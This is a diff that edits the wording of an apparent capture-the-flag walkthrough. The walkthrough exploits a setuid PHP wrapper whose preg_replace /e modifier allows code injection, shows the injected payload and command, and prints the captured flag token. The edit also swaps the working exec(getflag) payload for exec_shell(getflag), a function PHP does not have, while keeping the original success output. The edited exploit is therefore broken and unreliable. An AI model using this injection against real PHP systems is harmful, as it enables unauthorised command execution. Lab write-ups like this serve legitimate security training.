@@ -2,7 +2,7 @@
 
 ---
 
-In this level we have two files:
+In this level, we have two files:
 
 ```shell
 $ ls -l
@@ -11,9 +11,9 @@ total 12
 -rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
 ```
 
-Both of these files have as owner `flag06` and so there can run `getflag`.
+Both of these files have the owner `flag06`, and therefore, they can run `getflag`.
 
-But `level06` file has special permissions.
+However, the `level06` file has special permissions.
 
 ```shell
 $ getfacl level06
@@ -43,7 +43,7 @@ $ gdb -q level06
 0x80487e2:	 "/home/user/level06/level06.php"
 ```
 
-Now I know that this executable executes the file `level06.php`. Now what this file does ?
+Now I know that this executable executes the file `level06.php`. Now, what does this file do?
 
 ```shell
 $ cat level06.php
@@ -66,17 +66,18 @@ $ cat level06.php
 ?>
 ```
 
-This php script have vulnerability with the /e modifier. This means that when `preg_replace` is called the secoond parameter will be replaced and executed.
+This PHP script has a vulnerability with the /e modifier. This means that when `preg_replace` is called, the second parameter will be replaced and executed.
 
-For example :
+For example:
+
 ```
-preg_replace(..., ..., '"[x salut]"') => "salut" and salut will execute salut like a script.
+preg_replace(..., ..., '"[x salut]"') => "salut" and salut will execute like a script.
 ```
 
-So I want to execute `{${exac_shell(getflat)}}` so the input must be `[x {${exac_shell(getflat)}}]`.
+So I want to execute `{${exec_shell(getflag)}}`, so the input must be `[x {${exec_shell(getflag)}}]`.
 
 ```shell
-$ echo '[x {${exec(getflag)}}]' > /tmp/input
+$ echo '[x {${exec_shell(getflag)}}]' > /tmp/input
 $ ./level06 /tmp/input
 PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
 PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
@@ -84,8 +85,8 @@ PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboi
 
 ---
 
-*Source :*
+*Source:*
 
-*https://www.php.net/manual/fr/language.types.string.php#language.types.string.parsing.complex*
+*https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex*
 
 *https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4*
